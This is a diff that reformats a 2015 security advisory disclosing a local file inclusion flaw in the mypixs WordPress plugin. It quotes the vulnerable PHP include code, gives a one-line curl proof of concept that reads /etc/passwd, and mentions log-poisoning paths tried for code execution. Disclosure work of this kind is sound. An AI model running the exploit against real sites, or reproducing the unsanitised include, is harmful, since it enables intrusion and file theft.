@@ -1,23 +1,30 @@
-                                Advisory #: 154
-Title: Local File Inclusion Vulnerability in mypixs v0.3 wordpress plugin
-Author:Larry W. Cashdollar, @_larry0
-Date: 2015-09-15
-Download Site: https://wordpress.org/plugins/mypixs/
-Vendor:https://profiles.wordpress.org/tomb/
-Vendor Notified: 0000-00-00
-Vendor Contact:
-Description: MyPixs is a simple, yet powerful JavaScript and PHP application
-that gives you the possibility to display a lot of photos on your blog.
-Vulnerability:
-Typical local file inclusion vulnerability: from downloadpage.php: <?php $url =
-$_REQUEST["url"]; if ($url != "") { include($url); } ?> I've tried to get RCE
-but didn't have success reading from /proc/self/environ or /var/log/apache2/
-access.log
-CVE-2015-1000012
-JSON:Export
-Exploit Code:
-   1. curl http://example.com/wp-content/plugis/mypixs/mypixs/
-      downloadpage.php?url=/etc/passwd
-   2.  
-Screen Shots:
-Advisory: http://www.vapidlabs.com/advisory.php?v=154
+
+                               Advisory #: 154
+
+   Title: Local File Inclusion Vulnerability in mypixs v0.3 wordpress
+   plugin
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2015-09-15
+   Download Site: https://wordpress.org/plugins/mypixs/
+   Vendor: https://profiles.wordpress.org/tomb/
+   Vendor Notified: 0000-00-00
+   Vendor Contact:
+   Description: MyPixs is a simple, yet powerful JavaScript and PHP
+   application that gives you the possibility to display a lot of photos
+   on your blog.
+   Vulnerability:
+   Typical local file inclusion vulnerability: from downloadpage.php:
+   <?php $url = $_REQUEST["url"]; if ($url != "") { include($url); } ?>
+   I've tried to get RCE but didn't have success reading from
+   /proc/self/environ or /var/log/apache2/access.log
+   CVE-2015-1000012
+   JSON: Export
+   Exploit Code:
+
+    1. curl
+       http://example.com/wp-content/plugis/mypixs/mypixs/downloadpage.php
+       ?url=/etc/passwd
+    2.
+
+   Screen Shots:
+   Advisory: http://www.vapidlabs.com/advisory.php?v=154
